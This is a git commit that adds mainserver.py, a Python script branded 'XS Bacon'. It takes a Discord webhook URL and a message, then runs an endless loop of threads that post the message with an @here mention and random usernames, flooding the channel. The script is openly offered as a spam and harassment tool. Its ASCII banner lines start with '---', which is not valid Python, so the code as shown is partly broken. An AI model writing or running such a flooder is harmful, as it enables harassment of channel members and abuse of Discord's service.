648d61de06de75e7a9185d70ec3143d1522d2fce
XSSBacon <123257732+XSSBacon@users.noreply.github.com>
2023-01-26 17:30:13 +0000

    Create mainserver.py

---
+++ mainserver.py
@@ -0,0 +1,40 @@
+-------------------------------------------------------------------
+---██╗░░██╗░██████╗░██████╗██████╗░░█████╗░░█████╗░░█████╗░███╗░░██╗
+---╚██╗██╔╝██╔════╝██╔════╝██╔══██╗██╔══██╗██╔══██╗██╔══██╗████╗░██║
+---╚███╔╝░╚█████╗░╚█████╗░██████╦╝███████║██║░░╚═╝██║░░██║██╔██╗██║
+---██╔██╗░░╚═══██╗░╚═══██╗██╔══██╗██╔══██║██║░░██╗██║░░██║██║╚████║
+---██╔╝╚██╗██████╔╝██████╔╝██████╦╝██║░░██║╚█████╔╝╚█████╔╝██║░╚███║
+---╚═╝░░╚═╝╚═════╝░╚═════╝░╚═════╝░╚═╝░░╚═╝░╚════╝░░╚════╝░╚═╝░░╚══╝
+--                  github.com/XSSBACON                          --
+
+import os
+import random
+import threading
+from time import sleep
+import requests
+
+print(f"""
+
+XS Bacon
+Ghalbeyou presents ...
+""")
+sleep(2)
+os.system("cls")
+# load up the main
+LINK = input("Enter the discord webhook url: ")
+sleep(2)
+os.system("cls")
+MSG = input("Enter the message you want to spam with mention everyone: ")
+print("Starting to spam...")
+sleep(2)
+os.system("cls")
+def send_message(link, msg):
+    print(f"Sending message ...")
+    try:
+        requests.post(link, data={"content": f"@here\n{msg}", "username": random.randint(123, 12318248124)})
+        print("Message sent!")
+    except:
+        pass
+while True:
+    t = threading.Thread(target=send_message, args=(LINK, MSG))
+    t.start()
